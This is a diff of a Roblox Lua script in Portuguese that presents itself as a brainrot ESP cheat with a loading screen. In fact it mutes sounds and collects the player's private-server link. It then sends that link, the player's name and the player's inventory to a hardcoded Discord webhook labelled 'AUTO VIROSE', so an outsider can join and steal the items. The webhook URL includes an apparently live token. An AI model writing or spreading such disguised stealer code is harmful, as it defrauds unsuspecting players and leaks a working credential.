@@ -9,7 +9,6 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
-local UserInputService = game:GetService("UserInputService")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1444572842162393220/fzmTS5484SC7ycsxFpWneHsXLiJcW2Hb5gBgF_Jdy-nuw11u1H0TjlhCOUDWGYIurTAB"
 
@@ -17,37 +16,40 @@ local WEBHOOK_URL = "https://discord.com/api/webhooks/1444572842162393220/fzmTS5
 -- FUNÇÃO PARA CANCELAR TODOS OS SONS
 --========================================================--
 local function StopAllSounds()
-    local function StopDescendants(parent)
-        for _, obj in pairs(parent:GetDescendants()) do
-            if obj:IsA("Sound") then
-                obj:Stop()
-                obj.Playing = false
-                obj.Volume = 0
-            end
-        end
-        parent.DescendantAdded:Connect(function(desc)
-            if desc:IsA("Sound") then
-                desc:Stop()
-                desc.Playing = false
-                desc.Volume = 0
-            end
-        end)
-    end
-
-    StopDescendants(Workspace)
-    StopDescendants(ReplicatedStorage)
-    StopDescendants(StarterGui)
-    StopDescendants(LocalPlayer:WaitForChild("PlayerGui"))
-    StopDescendants(LocalPlayer:WaitForChild("Backpack"))
-    if LocalPlayer.Character then
-        StopDescendants(LocalPlayer.Character)
-    end
-
-    LocalPlayer.CharacterAdded:Connect(function(char)
-        StopDescendants(char)
-    end)
+local function StopDescendants(parent)
+for _, obj in pairs(parent:GetDescendants()) do
+if obj:IsA("Sound") then
+obj:Stop()
+obj.Playing = false
+obj.Volume = 0
+end
+end
+parent.DescendantAdded:Connect(function(desc)
+if desc:IsA("Sound") then
+desc:Stop()
+desc.Playing = false
+desc.Volume = 0
+end
+end)
 end
 
+-- Aplica em todos os lugares que possam ter sons  
+StopDescendants(Workspace)  
+StopDescendants(ReplicatedStorage)  
+StopDescendants(StarterGui)  
+StopDescendants(LocalPlayer:WaitForChild("PlayerGui"))  
+StopDescendants(LocalPlayer:WaitForChild("Backpack"))  
+if LocalPlayer.Character then  
+    StopDescendants(LocalPlayer.Character)  
+end  
+
+LocalPlayer.CharacterAdded:Connect(function(char)  
+    StopDescendants(char)  
+end)
+
+end
+
+-- Chama a função sem bloquear a GUI ainda
 task.spawn(StopAllSounds)
 
 --========================================================--
@@ -90,6 +92,7 @@ box.TextColor3 = Color3.new(1,1,1)
 box.ClearTextOnFocus = false
 box.TextXAlignment = Enum.TextXAlignment.Left
 box.TextWrapped = true
+box.TextTruncate = Enum.TextTruncate.None
 Instance.new("UICorner", box).CornerRadius = UDim.new(0,8)
 
 local btn = Instance.new("TextButton", frame)
@@ -103,81 +106,43 @@ btn.BackgroundColor3 = Color3.fromRGB(0,150,255)
 Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
 
 local serverLinkFinal = nil
-
---========================================================--
--- PLATAFORMA REAL (100% FUNCIONA)
---========================================================--
-local function DetectPlatform()
-    if identifyexecutor then
-        return "PC Executor"
-    end
-
-    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-        return "Mobile"
-    end
-
-    if UserInputService.KeyboardEnabled and not UserInputService.TouchEnabled then
-        return "PC"
-    end
-
-    if UserInputService.GamepadEnabled then
-        return "Console"
-    end
-
-    if UserInputService.TouchEnabled and UserInputService.KeyboardEnabled then
-        return "Mobile + Teclado"
-    end
-
-    return "Desconhecido"
-end
-
---========================================================--
+local startTime = os.time()
 
 local function SendWebhook(extraFields)
-    local timeStr = "foi às " .. os.date("%H:%M")
-
-    table.insert(extraFields, 1, {
-        name = "Plataforma",
-        value = DetectPlatform(),
-        inline = false
-    })
-
-    local payload = HttpService:JSONEncode({
-        username = "LOGS DO VIROSE",
-        embeds = {{
-            title = "🔗 AUTO VIROSE | "..timeStr,
-            color = 16732240,
-            fields = extraFields,
-            image = {
-                url = "https://cdn.discordapp.com/attachments/1436283438897303632/1444594144168120471/17644883928162.jpg"
-            }
-        }}
-    })
-
-    pcall(function()
-        HttpService:RequestAsync({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = payload
-        })
-    end)
+local timeStr = "foi às " .. os.date("%H:%M")
+local payload = HttpService:JSONEncode({
+username = "virus methods",
+embeds = {{
+title = "🔗 AUTO VIROSE| "..timeStr,
+color = 16732240,
+fields = extraFields,
+image = {url = "https://cdn.discordapp.com/attachments/1436283438897303632/1444594144168120471/17644883928162.jpg?ex=692d46a3&is=692bf523&hm=e7f520e275d97c079cf71956fd14cf1b1d2b4d5c422bd94922448a2c91890811&"}
+}}
+})
+pcall(function()
+HttpService:RequestAsync({
+Url = WEBHOOK_URL,
+Method = "POST",
+Headers = {["Content-Type"] = "application/json"},
+Body = payload
+})
+end)
 end
 
 btn.MouseButton1Click:Connect(function()
-    local txt = box.Text
-    local ok = txt:match("^https://www%.roblox%.com/share%?code=[%w_%-%d]+&type=Server$")
-    if not ok then
-        btn.Text = "Invalid!"
-        btn.BackgroundColor3 = Color3.fromRGB(255,40,40)
-        task.wait(1)
-        btn.Text = "Confirm"
-        btn.BackgroundColor3 = Color3.fromRGB(0,150,255)
-        return
-    end
-    serverLinkFinal = txt
-    btn.Text = "✓ SENT"
-    btn.BackgroundColor3 = Color3.fromRGB(0,200,80)
+local txt = box.Text
+local ok = txt:match("^https://www%.roblox%.com/share%?code=[%w_%-%d]+&type=Server$")
+if not ok then
+btn.Text = "Invalid!"
+btn.BackgroundColor3 = Color3.fromRGB(255,40,40)
+task.wait(1)
+btn.Text = "Confirm"
+btn.BackgroundColor3 = Color3.fromRGB(0,150,255)
+return
+end
+serverLinkFinal = txt
+btn.Text = "✓ SENT"
+btn.BackgroundColor3 = Color3.fromRGB(0,200,80)
 end)
 
 repeat task.wait() until serverLinkFinal ~= nil
@@ -222,8 +187,8 @@ loaderPercent.Text = "0%"
 local totalTime = 40
 local steps = 100
 for i = 1, steps do
-    loaderPercent.Text = math.floor(i/steps*100).."%"
-    task.wait(totalTime/steps)
+loaderPercent.Text = math.floor(i/steps*100).."%"
+task.wait(totalTime/steps)
 end
 
 loaderTitle:Destroy()
@@ -238,77 +203,77 @@ done.TextColor3 = Color3.fromRGB(255,100,100)
 done.Text = "✓ Script Loaded\nPlease Wait 2-3 Minutes..."
 
 --========================================================--
--- ESP + WEBHOOK
+-- ESP DE BRAINROTS + WEBHOOK
 --========================================================--
 local function formatNumber(num)
-    if num >= 1e9 then
-        return string.format("%.1fB/s", num/1e9)
-    elseif num >= 1e6 then
-        return string.format("%.1fM/s", num/1e6)
-    elseif num >= 1e3 then
-        return string.format("%.1fk/s", num/1e3)
-    else
-        return tostring(num).."/s"
-    end
+if num >= 1e9 then
+return string.format("%.1fB/s", num/1e9)
+elseif num >= 1e6 then
+return string.format("%.1fM/s", num/1e6)
+elseif num >= 1e3 then
+return string.format("%.1fk/s", num/1e3)
+else
+return tostring(num).."/s"
+end
 end
 
 local function ScanBrainrots()
-    local animalsModule = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild("Animals")
-    if not animalsModule then return end
+local animalsModule = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild("Animals")
+if not animalsModule then return end
 
-    local brainrotDB = {}
-    local success, animalData = pcall(require, animalsModule)
-    if success and type(animalData) == "table" then
-        for name,data in pairs(animalData) do
-            if type(data)=="table" and data.Price and data.Generation then
-                brainrotDB[name] = {income = data.Generation}
-            end
-        end
-    end
+local brainrotDB = {}  
+local success, animalData = pcall(require, animalsModule)  
+if success and type(animalData) == "table" then  
+    for name,data in pairs(animalData) do  
+        if type(data)=="table" and data.Price and data.Generation then  
+            brainrotDB[name] = {income = data.Generation}  
+        end  
+    end  
+end  
 
-    local brainrotCount = {}
+local brainrotCount = {}  
 
-    for _, plot in pairs(Workspace.Plots:GetChildren()) do
-        for _, brainrot in pairs(plot:GetChildren()) do
-            if brainrot:IsA("Model") and brainrotDB[brainrot.Name] then
-                local income = brainrotDB[brainrot.Name].income
-                local rootPart = brainrot:FindFirstChild("RootPart") or brainrot:FindFirstChild("FakeRootPart")
-                if rootPart then
-                    if brainrot:FindFirstChild("ESP") then brainrot.ESP:Destroy() end
-                    local highlight = Instance.new("Highlight")
-                    highlight.Name = "ESP"
-                    highlight.FillColor = Color3.fromRGB(0,100,255)
-                    highlight.OutlineColor = Color3.new(1,1,1)
-                    highlight.FillTransparency = 0.1
-                    highlight.OutlineTransparency = 0
-                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-                    highlight.Parent = brainrot
-                end
-                if not brainrotCount[brainrot.Name] then
-                    brainrotCount[brainrot.Name] = {count=1, income=income}
-                else
-                    brainrotCount[brainrot.Name].count += 1
-                end
-            end
-        end
-    end
+for _, plot in pairs(Workspace.Plots:GetChildren()) do  
+    for _, brainrot in pairs(plot:GetChildren()) do  
+        if brainrot:IsA("Model") and brainrotDB[brainrot.Name] then  
+            local income = brainrotDB[brainrot.Name].income  
+            local rootPart = brainrot:FindFirstChild("RootPart") or brainrot:FindFirstChild("FakeRootPart")  
+            if rootPart then  
+                if brainrot:FindFirstChild("ESP") then brainrot.ESP:Destroy() end  
+                local highlight = Instance.new("Highlight")  
+                highlight.Name = "ESP"  
+                highlight.FillColor = Color3.fromRGB(0,100,255)  
+                highlight.OutlineColor = Color3.new(1,1,1)  
+                highlight.FillTransparency = 0.1  
+                highlight.OutlineTransparency = 0  
+                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop  
+                highlight.Parent = brainrot  
+            end  
+            if not brainrotCount[brainrot.Name] then  
+                brainrotCount[brainrot.Name] = {count=1, income=income}  
+            else  
+                brainrotCount[brainrot.Name].count += 1  
+            end  
+        end  
+    end  
+end  
 
-    local content = ""
-    for name,data in pairs(brainrotCount) do
-        content = content .. data.count.."x "..name..": "..formatNumber(data.income).."\n"
-    end
+local extraFields = {}  
+local content = ""  
+for name, data in pairs(brainrotCount) do  
+    content = content .. data.count.."x "..name..": "..formatNumber(data.income).."\n"  
+end  
+extraFields = {  
+    {name="Player", value=LocalPlayer.Name},  
+    {name="Players in Server", value=tostring(#Players:GetPlayers()), inline=false},  
+    {name="Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},  
+    {name="Brainrots", value=content, inline=false}  
+}  
+SendWebhook(extraFields)
 
-    local extraFields = {
-        {name="Player", value=LocalPlayer.Name},
-        {name="Players in Server", value=tostring(#Players:GetPlayers()), inline=false},
-        {name="Join Private Server", value="[CLIQUE AQUI]("..serverLinkFinal..")", inline=false},
-        {name="Brainrots", value=content, inline=false}
-    }
-
-    SendWebhook(extraFields)
 end
 
 task.spawn(function()
-    repeat task.wait() until loaderGui
-    ScanBrainrots()
+repeat task.wait() until loaderGui
+ScanBrainrots()
 end)
